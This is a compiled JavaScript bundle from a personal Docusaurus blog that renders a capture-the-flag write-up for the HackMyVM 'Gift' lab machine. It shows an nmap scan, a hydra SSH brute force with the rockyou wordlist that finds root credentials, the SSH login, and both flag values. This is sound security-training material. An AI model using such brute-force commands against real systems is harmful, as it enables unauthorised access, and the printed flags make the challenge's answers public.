"use strict";(globalThis.webpackChunkmy_own_blog=globalThis.webpackChunkmy_own_blog||[]).push([[1381],{28453:(e,n,s)=>{s.d(n,{R:()=>o,x:()=>a});var r=s(96540);const t={},i=r.createContext(t);function o(e){const n=r.useContext(i);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:o(e.components),r.createElement(i.Provider,{value:n},e.children)}},69008:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/web-1dd2719379616749dae6307c76f7d9ab.png"},80729:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>h,frontMatter:()=>o,metadata:()=>r,toc:()=>l});const r=JSON.parse('{"id":"hack-my-vm/machines/gift/gift","title":"Gift","description":"- Description: A really easy VM. Thats a gift","source":"@site/docs/hack-my-vm/machines/gift/gift.mdx","sourceDirName":"hack-my-vm/machines/gift","slug":"/hack-my-vm/machines/gift/","permalink":"/my-small-blog/docs/hack-my-vm/machines/gift/","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"tags":[]},"sidebar":"tutorialSidebar","previous":{"title":"Machines","permalink":"/my-small-blog/docs/category/machines"},"next":{"title":"Hunter","permalink":"/my-small-blog/docs/hack-my-vm/machines/hunter/"}}');var t=s(74848),i=s(28453);const o={tags:[]},a="Gift",c={},l=[{value:"\ud83d\udd0e Solution",id:"-solution",level:2},{value:"\ud83d\udea9Flag",id:"flag",level:2}];function d(e){const n={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"gift",children:"Gift"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Description:"})," A really easy VM. Thats a gift"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Difficulty:"})," Easy"]}),"\n"]}),"\n",(0,t.jsx)(n.hr,{}),"\n",(0,t.jsx)(n.h2,{id:"-solution",children:"\ud83d\udd0e Solution"}),"\n",(0,t.jsxs)(n.p,{children:["When I booted the Gift VM it picked up an IP address.\r\nA quick ",(0,t.jsx)(n.strong,{children:"nmap"})," service scan shows 2 open ports: SSH on 22 and HTTP on 80."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"> nmap -sV 10.0.2.4\r\n\r\nPORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)\r\n80/tcp open  http    nginx\r\nMAC Address: 08:00:27:0A:DB:80 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n"})}),"\n",(0,t.jsxs)(n.p,{children:["I opened ",(0,t.jsx)(n.code,{children:"http://<IP-address>:80"})," in the browser and the page only displayed a short line of text (as in the screenshot) - not much to go on (mayybe ^^)."]}),"\n",(0,t.jsx)("div",{style:{width:"100%",margin:"0 auto"},children:(0,t.jsx)("img",{src:s(69008).A,style:{width:"100%",height:"auto"}})}),"\n",(0,t.jsxs)(n.p,{children:["Since SSH was available on port 22 I decided to try a brute-force approach for valid credentials.\r\nFor usernames I prepared a small list of common accounts (",(0,t.jsx)(n.code,{children:"kali"}),", ",(0,t.jsx)(n.code,{children:"root"}),", ",(0,t.jsx)(n.code,{children:"gift"}),") in ",(0,t.jsx)(n.code,{children:"username.txt"}),", and for passwords I used the ",(0,t.jsx)(n.code,{children:"rockyou"})," wordlist."]}),"\n",(0,t.jsxs)(n.p,{children:["I ran ",(0,t.jsx)(n.code,{children:"hydra"})," against the SSH service and it returned a successful credential pair: ",(0,t.jsx)(n.code,{children:"root:simple"}),"."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"> hydra -L username.txt -P rockyou.txt -s 22 ssh://10.0.2.4\r\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\r\n\r\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-04 10:08:34\r\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\r\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\r\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 57377596 login tries (l:4/p:14344399), ~3586100 tries per task\r\n[DATA] attacking ssh://10.0.2.4:22/\r\n[22][ssh] host: 10.0.2.4   login: root   password: simple\r\n[STATUS] 14346452.00 tries/min, 14346452 tries in 00:01h, 43031147 to do in 00:03h, 13 active\n"})}),"\n",(0,t.jsx)(n.p,{children:"Using the discovered credentials I SSHed into the box:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"> ssh root@10.0.2.4\r\nroot@10.0.2.4's password: \r\nIM AN SSH SERVER\n"})}),"\n",(0,t.jsx)(n.p,{children:"Once in, listing the home directory revealed 2 flag files."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"gift:~# ls\r\nroot.txt  user.txt\n"})}),"\n",(0,t.jsx)(n.p,{children:"Reading them gave the user and root flags:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"gift:~# cat user.txt \r\nHMV665sXzDS\r\ngift:~# cat root.txt \r\nHMVtyr543FG\n"})}),"\n",(0,t.jsx)(n.h2,{id:"flag",children:"\ud83d\udea9Flag"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"User flag:"})}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.code,{children:"HMV665sXzDS"})}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Root flag:"})}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.code,{children:"HMVtyr543FG"})}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}}}]);